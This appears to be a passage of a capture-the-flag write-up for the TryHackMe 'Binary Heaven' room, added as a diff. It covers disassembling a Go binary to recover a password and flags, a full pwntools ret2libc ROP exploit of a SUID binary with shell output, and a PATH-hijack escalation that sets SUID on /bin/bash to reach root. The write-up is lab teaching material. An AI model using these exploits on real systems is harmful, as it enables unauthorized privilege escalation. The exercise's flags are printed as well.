@@ -488,3 +488,493 @@ Dump of assembler code for function main.main:
    0x00000000004a5320 <+96>:    lea    0xbb99(%rip),%rcx        # 0x4b0ec0
    0x00000000004a5327 <+103>:   mov    %rcx,0x98(%rsp)
    0x00000000004a532f <+111>:   mov    %rax,0xa0(%rsp)
+   0x00000000004a5337 <+119>:   mov    %rcx,0xa8(%rsp)
+   0x00000000004a533f <+127>:   lea    0x441ea(%rip),%rax        # 0x4e9530
+   0x00000000004a5346 <+134>:   mov    %rax,0xb0(%rsp)
+   0x00000000004a534e <+142>:   mov    0xc395b(%rip),%rax        # 0x568cb0 <os.Stdout>
+   0x00000000004a5355 <+149>:   lea    0x45a04(%rip),%rdx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
+   0x00000000004a535c <+156>:   mov    %rdx,(%rsp)
+   0x00000000004a5360 <+160>:   mov    %rax,0x8(%rsp)
+   0x00000000004a5365 <+165>:   lea    0x98(%rsp),%rax
+   0x00000000004a536d <+173>:   mov    %rax,0x10(%rsp)
+   0x00000000004a5372 <+178>:   movq   $0x2,0x18(%rsp)
+   0x00000000004a537b <+187>:   movq   $0x2,0x20(%rsp)
+   0x00000000004a5384 <+196>:   call   0x499620 <fmt.Fprintln>
+   0x00000000004a5389 <+201>:   lea    0xbb30(%rip),%rax        # 0x4b0ec0
+   0x00000000004a5390 <+208>:   mov    %rax,(%rsp)
+   0x00000000004a5394 <+212>:   call   0x40cde0 <runtime.newobject>
+   0x00000000004a5399 <+217>:   mov    0x8(%rsp),%rax
+   0x00000000004a539e <+222>:   mov    %rax,0x40(%rsp)
+   0x00000000004a53a3 <+227>:   xorps  %xmm0,%xmm0
+   0x00000000004a53a6 <+230>:   movups %xmm0,0x48(%rsp)
+   0x00000000004a53ab <+235>:   lea    0x95ee(%rip),%rcx        # 0x4ae9a0
+   0x00000000004a53b2 <+242>:   mov    %rcx,0x48(%rsp)
+   0x00000000004a53b7 <+247>:   mov    %rax,0x50(%rsp)
+   0x00000000004a53bc <+252>:   mov    0xc38e5(%rip),%rcx        # 0x568ca8 <os.Stdin>
+   0x00000000004a53c3 <+259>:   lea    0x45976(%rip),%rdx        # 0x4ead40 <go.itab.*os.File,io.Reader>                                                                                
+   0x00000000004a53ca <+266>:   mov    %rdx,(%rsp)
+   0x00000000004a53ce <+270>:   mov    %rcx,0x8(%rsp)
+   0x00000000004a53d3 <+275>:   lea    0x48(%rsp),%rcx
+   0x00000000004a53d8 <+280>:   mov    %rcx,0x10(%rsp)
+   0x00000000004a53dd <+285>:   movq   $0x1,0x18(%rsp)
+   0x00000000004a53e6 <+294>:   movq   $0x1,0x20(%rsp)
+   0x00000000004a53ef <+303>:   call   0x49f8c0 <fmt.Fscanln>
+   0x00000000004a53f4 <+308>:   mov    0x40(%rsp),%rax
+   0x00000000004a53f9 <+313>:   mov    0x8(%rax),%rcx
+   0x00000000004a53fd <+317>:   mov    (%rax),%rax
+   0x00000000004a5400 <+320>:   cmp    $0xb,%rcx
+   0x00000000004a5404 <+324>:   je     0x4a54a1 <main.main+481>
+   0x00000000004a540a <+330>:   lea    0x24ba9(%rip),%rax        # 0x4c9fba
+   0x00000000004a5411 <+337>:   mov    %rax,(%rsp)
+   0x00000000004a5415 <+341>:   movq   $0x5,0x8(%rsp)
+   0x00000000004a541e <+350>:   xchg   %ax,%ax
+   0x00000000004a5420 <+352>:   call   0x40a120 <runtime.convTstring>
+   0x00000000004a5425 <+357>:   mov    0x10(%rsp),%rax
+   0x00000000004a542a <+362>:   xorps  %xmm0,%xmm0
+   0x00000000004a542d <+365>:   movups %xmm0,0x58(%rsp)
+   0x00000000004a5432 <+370>:   movups %xmm0,0x68(%rsp)
+   0x00000000004a5437 <+375>:   lea    0xba82(%rip),%rcx        # 0x4b0ec0
+   0x00000000004a543e <+382>:   mov    %rcx,0x58(%rsp)
+   0x00000000004a5443 <+387>:   mov    %rax,0x60(%rsp)
+   0x00000000004a5448 <+392>:   mov    %rcx,0x68(%rsp)
+   0x00000000004a544d <+397>:   lea    0x440fc(%rip),%rax        # 0x4e9550
+   0x00000000004a5454 <+404>:   mov    %rax,0x70(%rsp)
+   0x00000000004a5459 <+409>:   mov    0xc3850(%rip),%rax        # 0x568cb0 <os.Stdout>
+   0x00000000004a5460 <+416>:   lea    0x458f9(%rip),%rcx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
+   0x00000000004a5467 <+423>:   mov    %rcx,(%rsp)
+   0x00000000004a546b <+427>:   mov    %rax,0x8(%rsp)
+   0x00000000004a5470 <+432>:   lea    0x58(%rsp),%rax
+   0x00000000004a5475 <+437>:   mov    %rax,0x10(%rsp)
+   0x00000000004a547a <+442>:   movq   $0x2,0x18(%rsp)
+   0x00000000004a5483 <+451>:   movq   $0x2,0x20(%rsp)
+   0x00000000004a548c <+460>:   call   0x499620 <fmt.Fprintln>
+   0x00000000004a5491 <+465>:   mov    0xb8(%rsp),%rbp
+   0x00000000004a5499 <+473>:   add    $0xc0,%rsp
+   0x00000000004a54a0 <+480>:   ret    
+   0x00000000004a54a1 <+481>:   mov    %rax,(%rsp)
+   0x00000000004a54a5 <+485>:   lea    0x2585f(%rip),%rax        # 0x4cad0b
+   0x00000000004a54ac <+492>:   mov    %rax,0x8(%rsp)
+   0x00000000004a54b1 <+497>:   mov    %rcx,0x10(%rsp)
+   0x00000000004a54b6 <+502>:   call   0x4022e0 <runtime.memequal>
+   0x00000000004a54bb <+507>:   cmpb   $0x0,0x18(%rsp)
+   0x00000000004a54c0 <+512>:   je     0x4a540a <main.main+330>
+   0x00000000004a54c6 <+518>:   lea    0x24af2(%rip),%rax        # 0x4c9fbf
+   0x00000000004a54cd <+525>:   mov    %rax,(%rsp)
+   0x00000000004a54d1 <+529>:   movq   $0x5,0x8(%rsp)
+   0x00000000004a54da <+538>:   call   0x40a120 <runtime.convTstring>
+   0x00000000004a54df <+543>:   mov    0x10(%rsp),%rax
+   0x00000000004a54e4 <+548>:   xorps  %xmm0,%xmm0
+   0x00000000004a54e7 <+551>:   movups %xmm0,0x78(%rsp)
+   0x00000000004a54ec <+556>:   movups %xmm0,0x88(%rsp)
+   0x00000000004a54f4 <+564>:   lea    0xb9c5(%rip),%rcx        # 0x4b0ec0
+   0x00000000004a54fb <+571>:   mov    %rcx,0x78(%rsp)
+   0x00000000004a5500 <+576>:   mov    %rax,0x80(%rsp)
+   0x00000000004a5508 <+584>:   mov    %rcx,0x88(%rsp)
+   0x00000000004a5510 <+592>:   lea    0x44029(%rip),%rax        # 0x4e9540
+   0x00000000004a5517 <+599>:   mov    %rax,0x90(%rsp)
+   0x00000000004a551f <+607>:   mov    0xc378a(%rip),%rax        # 0x568cb0 <os.Stdout>
+   0x00000000004a5526 <+614>:   lea    0x45833(%rip),%rcx        # 0x4ead60 <go.itab.*os.File,io.Writer>                                                                                
+   0x00000000004a552d <+621>:   mov    %rcx,(%rsp)
+   0x00000000004a5531 <+625>:   mov    %rax,0x8(%rsp)
+   0x00000000004a5536 <+630>:   lea    0x78(%rsp),%rax
+   0x00000000004a553b <+635>:   mov    %rax,0x10(%rsp)
+   0x00000000004a5540 <+640>:   movq   $0x2,0x18(%rsp)
+   0x00000000004a5549 <+649>:   movq   $0x2,0x20(%rsp)
+   0x00000000004a5552 <+658>:   call   0x499620 <fmt.Fprintln>
+   0x00000000004a5557 <+663>:   jmp    0x4a5491 <main.main+465>
+   0x00000000004a555c <+668>:   nopl   0x0(%rax)
+   0x00000000004a5560 <+672>:   call   0x461620 <runtime.morestack_noctxt>
+   0x00000000004a5565 <+677>:   jmp    0x4a52c0 <main.main>
+End of assembler dump.
+(gdb) break *0x00000000004a54b6
+Note: breakpoint 2 also set at pc 0x4a54b6.
+Breakpoint 3 at 0x4a54b6: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 14.
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) n
+Program not restarted.
+(gdb) c
+Continuing.
+ 
+Say the magic word >>                                                                       
+123456789AB
+
+***radare 2***
+                                                                                            
+┌──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
+└─$ r2 -d -A angel_B
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Find function and symbol names from golang binaries (aang)
+[x] Found 1860 symbols and saved them at sym.go.*
+[x] Analyze all flags starting with sym.go. (aF @@f:sym.go.*)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Skipping type matching analysis in debugger mode (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x00464700]> pdf @sym.main.main
+            ;-- sym.go.main.main:
+            ; CODE XREF from sym.main.main @ 0x4a5565
+┌ 678: sym.main.main ();
+│           ; var int64_t var_8h @ rsp+0x8
+│           ; var int64_t var_10h @ rsp+0x10
+│           ; var int64_t var_18h @ rsp+0x18
+│           ; var int64_t var_20h @ rsp+0x20
+│           ; var int64_t var_40h @ rsp+0x40
+│           ; var int64_t var_48h @ rsp+0x48
+│           ; var int64_t var_50h @ rsp+0x50
+│           ; var int64_t var_58h @ rsp+0x58
+│           ; var int64_t var_60h @ rsp+0x60
+│           ; var int64_t var_68h @ rsp+0x68
+│           ; var int64_t var_70h @ rsp+0x70
+│           ; var int64_t var_78h @ rsp+0x78
+│           ; var int64_t var_80h @ rsp+0x80
+│           ; var int64_t var_88h @ rsp+0x88
+│           ; var int64_t var_90h @ rsp+0x90
+│           ; var int64_t var_98h @ rsp+0x98
+│           ; var int64_t var_a0h @ rsp+0xa0
+│           ; var int64_t var_a8h @ rsp+0xa8
+│           ; var int64_t var_b0h @ rsp+0xb0
+│           ; var int64_t var_b8h @ rsp+0xb8
+│       ┌─> 0x004a52c0      64488b0c25f8.  mov rcx, qword fs:[0xfffffffffffffff8]
+│       ╎   0x004a52c9      488d4424c0     lea rax, [rsp - 0x40]
+│       ╎   0x004a52ce      483b4110       cmp rax, qword [rcx + 0x10]
+│      ┌──< 0x004a52d2      0f8688020000   jbe 0x4a5560
+│      │╎   0x004a52d8      4881ecc00000.  sub rsp, 0xc0
+│      │╎   0x004a52df      4889ac24b800.  mov qword [var_b8h], rbp
+│      │╎   0x004a52e7      488dac24b800.  lea rbp, [var_b8h]
+│      │╎   0x004a52ef      488d05ce4c02.  lea rax, [0x004c9fc4]
+│      │╎   0x004a52f6      48890424       mov qword [rsp], rax
+│      │╎   0x004a52fa      48c744240805.  mov qword [var_8h], 5
+│      │╎   0x004a5303      e8184ef6ff     call sym.runtime.convTstring
+│      │╎   0x004a5308      488b442410     mov rax, qword [var_10h]
+│      │╎   0x004a530d      0f57c0         xorps xmm0, xmm0
+│      │╎   0x004a5310      0f1184249800.  movups xmmword [var_98h], xmm0
+│      │╎   0x004a5318      0f118424a800.  movups xmmword [var_a8h], xmm0
+│      │╎   0x004a5320      488d0d99bb00.  lea rcx, [0x004b0ec0]
+│      │╎   0x004a5327      48898c249800.  mov qword [var_98h], rcx
+│      │╎   0x004a532f      48898424a000.  mov qword [var_a0h], rax
+│      │╎   0x004a5337      48898c24a800.  mov qword [var_a8h], rcx
+│      │╎   0x004a533f      488d05ea4104.  lea rax, [0x004e9530]
+│      │╎   0x004a5346      48898424b000.  mov qword [var_b0h], rax
+│      │╎   0x004a534e      488b055b390c.  mov rax, qword [obj.os.Stdout] ; [0x568cb0:8]=0
+│      │╎   0x004a5355      488d15045a04.  lea rdx, obj.go.itab.os.File_io.Writer ; 0x4ead60
+│      │╎   0x004a535c      48891424       mov qword [rsp], rdx
+│      │╎   0x004a5360      4889442408     mov qword [var_8h], rax
+│      │╎   0x004a5365      488d84249800.  lea rax, [var_98h]
+│      │╎   0x004a536d      4889442410     mov qword [var_10h], rax
+│      │╎   0x004a5372      48c744241802.  mov qword [var_18h], 2
+│      │╎   0x004a537b      48c744242002.  mov qword [var_20h], 2
+│      │╎   0x004a5384      e89742ffff     call sym.fmt.Fprintln
+│      │╎   0x004a5389      488d0530bb00.  lea rax, [0x004b0ec0]
+│      │╎   0x004a5390      48890424       mov qword [rsp], rax
+│      │╎   0x004a5394      e8477af6ff     call sym.runtime.newobject
+│      │╎   0x004a5399      488b442408     mov rax, qword [var_8h]
+│      │╎   0x004a539e      4889442440     mov qword [var_40h], rax
+│      │╎   0x004a53a3      0f57c0         xorps xmm0, xmm0
+│      │╎   0x004a53a6      0f11442448     movups xmmword [var_48h], xmm0
+│      │╎   0x004a53ab      488d0dee9500.  lea rcx, [0x004ae9a0]
+│      │╎   0x004a53b2      48894c2448     mov qword [var_48h], rcx
+│      │╎   0x004a53b7      4889442450     mov qword [var_50h], rax
+│      │╎   0x004a53bc      488b0de5380c.  mov rcx, qword [obj.os.Stdin] ; [0x568ca8:8]=0
+│      │╎   0x004a53c3      488d15765904.  lea rdx, obj.go.itab.os.File_io.Reader ; 0x4ead40
+│      │╎   0x004a53ca      48891424       mov qword [rsp], rdx
+│      │╎   0x004a53ce      48894c2408     mov qword [var_8h], rcx
+│      │╎   0x004a53d3      488d4c2448     lea rcx, [var_48h]
+│      │╎   0x004a53d8      48894c2410     mov qword [var_10h], rcx
+│      │╎   0x004a53dd      48c744241801.  mov qword [var_18h], 1
+│      │╎   0x004a53e6      48c744242001.  mov qword [var_20h], 1
+│      │╎   0x004a53ef      e8cca4ffff     call sym.fmt.Fscanln
+│      │╎   0x004a53f4      488b442440     mov rax, qword [var_40h]
+│      │╎   0x004a53f9      488b4808       mov rcx, qword [rax + 8]
+│      │╎   0x004a53fd      488b00         mov rax, qword [rax]
+│      │╎   0x004a5400      4883f90b       cmp rcx, 0xb                ; 11
+│     ┌───< 0x004a5404      0f8497000000   je 0x4a54a1
+│     ││╎   ; CODE XREF from sym.main.main @ 0x4a54c0
+│    ┌────> 0x004a540a      488d05a94b02.  lea rax, [0x004c9fba]
+│    ╎││╎   0x004a5411      48890424       mov qword [rsp], rax
+│    ╎││╎   0x004a5415      48c744240805.  mov qword [var_8h], 5
+│    ╎││╎   0x004a541e      6690           nop
+│    ╎││╎   0x004a5420      e8fb4cf6ff     call sym.runtime.convTstring
+│    ╎││╎   0x004a5425      488b442410     mov rax, qword [var_10h]
+│    ╎││╎   0x004a542a      0f57c0         xorps xmm0, xmm0
+│    ╎││╎   0x004a542d      0f11442458     movups xmmword [var_58h], xmm0
+│    ╎││╎   0x004a5432      0f11442468     movups xmmword [var_68h], xmm0
+│    ╎││╎   0x004a5437      488d0d82ba00.  lea rcx, [0x004b0ec0]
+│    ╎││╎   0x004a543e      48894c2458     mov qword [var_58h], rcx
+│    ╎││╎   0x004a5443      4889442460     mov qword [var_60h], rax
+│    ╎││╎   0x004a5448      48894c2468     mov qword [var_68h], rcx
+│    ╎││╎   0x004a544d      488d05fc4004.  lea rax, [0x004e9550]
+│    ╎││╎   0x004a5454      4889442470     mov qword [var_70h], rax
+│    ╎││╎   0x004a5459      488b0550380c.  mov rax, qword [obj.os.Stdout] ; [0x568cb0:8]=0
+│    ╎││╎   0x004a5460      488d0df95804.  lea rcx, obj.go.itab.os.File_io.Writer ; 0x4ead60
+│    ╎││╎   0x004a5467      48890c24       mov qword [rsp], rcx
+│    ╎││╎   0x004a546b      4889442408     mov qword [var_8h], rax
+│    ╎││╎   0x004a5470      488d442458     lea rax, [var_58h]
+│    ╎││╎   0x004a5475      4889442410     mov qword [var_10h], rax
+│    ╎││╎   0x004a547a      48c744241802.  mov qword [var_18h], 2
+│    ╎││╎   0x004a5483      48c744242002.  mov qword [var_20h], 2
+│    ╎││╎   0x004a548c      e88f41ffff     call sym.fmt.Fprintln
+│    ╎││╎   ; CODE XREF from sym.main.main @ 0x4a5557
+│   ┌─────> 0x004a5491      488bac24b800.  mov rbp, qword [var_b8h]
+│   ╎╎││╎   0x004a5499      4881c4c00000.  add rsp, 0xc0
+│   ╎╎││╎   0x004a54a0      c3             ret
+│   ╎╎││╎   ; CODE XREF from sym.main.main @ 0x4a5404
+│   ╎╎└───> 0x004a54a1      48890424       mov qword [rsp], rax
+│   ╎╎ │╎   0x004a54a5      488d055f5802.  lea rax, [0x004cad0b]       ; "GOg0esGrrr!IdeographicMedefaidrinNandinagariNew_Tai_LueOld_PersianOld_SogdianPau_Cin_HauSignWritingSoft_DottedWarang_CitiWhite_"                                                                          
+│   ╎╎ │╎   0x004a54ac      4889442408     mov qword [var_8h], rax
+│   ╎╎ │╎   0x004a54b1      48894c2410     mov qword [var_10h], rcx
+│   ╎╎ │╎   0x004a54b6      e825cef5ff     call sym.runtime.memequal
+│   ╎╎ │╎   0x004a54bb      807c241800     cmp byte [var_18h], 0
+│   ╎└────< 0x004a54c0      0f8444ffffff   je 0x4a540a
+│   ╎  │╎   0x004a54c6      488d05f24a02.  lea rax, [0x004c9fbf]
+│   ╎  │╎   0x004a54cd      48890424       mov qword [rsp], rax
+│   ╎  │╎   0x004a54d1      48c744240805.  mov qword [var_8h], 5
+│   ╎  │╎   0x004a54da      e8414cf6ff     call sym.runtime.convTstring
+│   ╎  │╎   0x004a54df      488b442410     mov rax, qword [var_10h]
+│   ╎  │╎   0x004a54e4      0f57c0         xorps xmm0, xmm0
+│   ╎  │╎   0x004a54e7      0f11442478     movups xmmword [var_78h], xmm0
+│   ╎  │╎   0x004a54ec      0f1184248800.  movups xmmword [var_88h], xmm0
+│   ╎  │╎   0x004a54f4      488d0dc5b900.  lea rcx, [0x004b0ec0]
+│   ╎  │╎   0x004a54fb      48894c2478     mov qword [var_78h], rcx
+│   ╎  │╎   0x004a5500      488984248000.  mov qword [var_80h], rax
+│   ╎  │╎   0x004a5508      48898c248800.  mov qword [var_88h], rcx
+│   ╎  │╎   0x004a5510      488d05294004.  lea rax, [0x004e9540]
+│   ╎  │╎   0x004a5517      488984249000.  mov qword [var_90h], rax
+│   ╎  │╎   0x004a551f      488b058a370c.  mov rax, qword [obj.os.Stdout] ; [0x568cb0:8]=0
+│   ╎  │╎   0x004a5526      488d0d335804.  lea rcx, obj.go.itab.os.File_io.Writer ; 0x4ead60
+│   ╎  │╎   0x004a552d      48890c24       mov qword [rsp], rcx
+│   ╎  │╎   0x004a5531      4889442408     mov qword [var_8h], rax
+│   ╎  │╎   0x004a5536      488d442478     lea rax, [var_78h]
+│   ╎  │╎   0x004a553b      4889442410     mov qword [var_10h], rax
+│   ╎  │╎   0x004a5540      48c744241802.  mov qword [var_18h], 2
+│   ╎  │╎   0x004a5549      48c744242002.  mov qword [var_20h], 2
+│   ╎  │╎   0x004a5552      e8c940ffff     call sym.fmt.Fprintln
+│   └─────< 0x004a5557      e935ffffff     jmp 0x4a5491
+..
+│      │╎   ; CODE XREF from sym.main.main @ 0x4a52d2
+│      └──> 0x004a5560      e8bbc0fbff     call sym.runtime.morestack_noctxt
+└       └─< 0x004a5565      e956fdffff     jmp sym.main.main
+[0x00464700]> 
+
+What is the password? GOg0esGrrr!
+
+What is the flag? (ssh) THM{crack3d_th3_gu4rd1an}
+
+──(kali㉿kali)-[~/Downloads/BinaryHeaven]
+└─$ scp guardian@10.10.66.17:/home/guardian/pwn_me /home/kali/Downloads/BinaryHeaven
+guardian@10.10.66.17's password: 
+pwn_me                                                    100%   15KB  23.5KB/s   00:00    
+
+Can you become the binexgod?
+Answer the questions below
+binexgod_flag.txt
+ 
+ Task 3 - Return to the origins
+
+There is another binary file named pwn_me and it has SUID bit set for user binexgod. Therefore, a logical assumption at this point would be, exploiting this binary should escalate us to user binexgod.
+
+It leaks the address of system, so we can bypass ASLR. Now, we have to find the offset for rip. we can use pwntools cyclic for creating it. Run cyclic <length>
+
+Put the pattern in temporary file, open the binary in gdb and run it with supplying that pattern. This will cause segfault. Take the value it gave and use cyclic -l value to find the offset
+
+Now we can automate the remaining ROP chain using pwntools.
+
+from pwn import *
+
+elf = context.binary = ELF('./pwn_me')
+libc = elf.libc
+p = process()
+
+#get the leaked address
+p.recvuntil('at: ')
+system_leak = int(p.recvline(), 16)
+
+#set our libc address according to the leaked address
+libc.address = system_leak - libc.sym['system']
+log.success('LIBC base: {}'.format(hex(libc.address)))
+
+#get location of binsh from libc
+binsh = next(libc.search(b'/bin/sh'))
+
+#build the rop chain
+rop = ROP(libc)
+rop.raw('A' * 32)
+rop.system(binsh)
+
+#send our rop chain
+p.sendline(rop.chain())
+
+#Get the shell
+p.interactive()
+
+uardian@heaven:~$ nano exploit.py
+guardian@heaven:~$ python exploit.py
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/guardian/.cache/.pwntools-cache-3.5/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+
+[3]+  Stopped                 python exploit.py
+guardian@heaven:~$ ls -la
+total 56
+drwxr-x--- 4 guardian guardian  4096 Aug  3 19:01 .
+drwxr-xr-x 5 root     root      4096 Mar  1  2021 ..
+-rw-rw-r-- 1 guardian guardian     0 May  8  2021 .bash_history
+-rw-r--r-- 1 guardian guardian   220 Mar  1  2021 .bash_logout
+-rw-r--r-- 1 guardian guardian  3771 Mar  1  2021 .bashrc
+drwx------ 3 guardian guardian  4096 Mar  4  2021 .cache
+-rw-rw-r-- 1 guardian guardian   550 Aug  3 19:01 exploit.py
+-rw-r--r-- 1 root     root        26 Mar 15  2021 guardian_flag.txt
+drwxrwxr-x 2 guardian guardian  4096 Mar  4  2021 .nano
+-rw-r--r-- 1 guardian guardian   655 Mar  1  2021 .profile
+-rwsr-sr-x 1 binexgod binexgod 15772 May  8  2021 pwn_me
+-rw------- 1 guardian guardian   228 May  8  2021 .python_history
+guardian@heaven:~$ cd .cache
+guardian@heaven:~/.cache$ ls
+motd.legal-displayed
+guardian@heaven:~/.cache$ ls -la
+total 12
+drwx------ 3 guardian guardian 4096 Mar  4  2021 .
+drwxr-x--- 4 guardian guardian 4096 Aug  3 19:01 ..
+-rw-r--r-- 1 guardian guardian    0 Mar  1  2021 motd.legal-displayed
+drwxrwxr-x 2 guardian guardian 4096 Mar  4  2021 .pwntools-cache-3.5                                                              
+guardian@heaven:~/.cache$ cd .pwntools-cache-3.5/
+guardian@heaven:~/.cache/.pwntools-cache-3.5$ ls -la
+total 8
+drwxrwxr-x 2 guardian guardian 4096 Mar  4  2021 .
+drwx------ 3 guardian guardian 4096 Mar  4  2021 ..
+-rw-rw-r-- 1 guardian guardian    0 May  8  2021 update
+guardian@heaven:~/.cache/.pwntools-cache-3.5$ cat update
+guardian@heaven:~/.cache/.pwntools-cache-3.5$ nano update
+guardian@heaven:~/.cache/.pwntools-cache-3.5$ cd ..
+guardian@heaven:~/.cache$ cd ..
+guardian@heaven:~$ ls
+exploit.py  guardian_flag.txt  pwn_me
+guardian@heaven:~$ python exploit.py
+[*] '/home/guardian/pwn_me'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] '/lib32/libc-2.23.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/home/guardian/pwn_me': pid 1974
+[+] LIBC base: 0xf7de1000
+[*] Loading gadgets for '/lib32/libc-2.23.so'
+[*] Switching to interactive mode
+```
+```text
+$ id
+uid=1002(binexgod) gid=1001(guardian) groups=1001(guardian)
+```
+```text
+$ ls
+exploit.py  guardian_flag.txt  pwn_me
+```
+```text
+$ find -name binexgod_flag.txt
+find: ‘./.cache’: Permission denied
+```
+```text
+$ whoami
+binexgod
+```
+```text
+$ ls
+exploit.py  guardian_flag.txt  pwn_me
+```
+```text
+$ pwd
+/home/guardian
+```
+```text
+$ cd ..
+```
+```text
+$ ls
+binexgod  guardian  lost+found
+```
+```text
+$ cd binexgod
+```
+```text
+$ ls
+binexgod_flag.txt  secret_of_heaven  vuln  vuln.c
+```
+```text
+$ cat binexgog_flag.txt
+cat: binexgog_flag.txt: No such file or directory
+```
+```text
+$ cat binexgod_flag.txt
+THM{b1n3xg0d_pwn3d}
+
+ ls
+binexgod_flag.txt  echo  secret_of_heaven  vuln  vuln.c
+```
+```text
+$ cat vuln.c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("/usr/bin/env echo Get out of heaven lol");
+}
+```
+```text
+$ echo "#!/bin/bash\nchmod u+s /bin/bash" > echo
+```
+```text
+$ chmod u+x echo
+```
+```text
+$ PATH=`pwd`:$PATH ./vuln
+```
+```text
+$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
+```
+```text
+$ bash -p
+```
+```text
+$ id
+uid=1002(binexgod) gid=1001(guardian) euid=0(root) groups=1001(guardian)
+```
+```text
+$ cd /root
+```
+
+## Privilege Escalation
+```text
+$ ls
+root.txt
+```
+```text
+$ cat root.txt
+THM{r00t_of_th3_he4v3n}
+```
+
+## Notes / Lessons Learned
+[[Autopsy]]
+
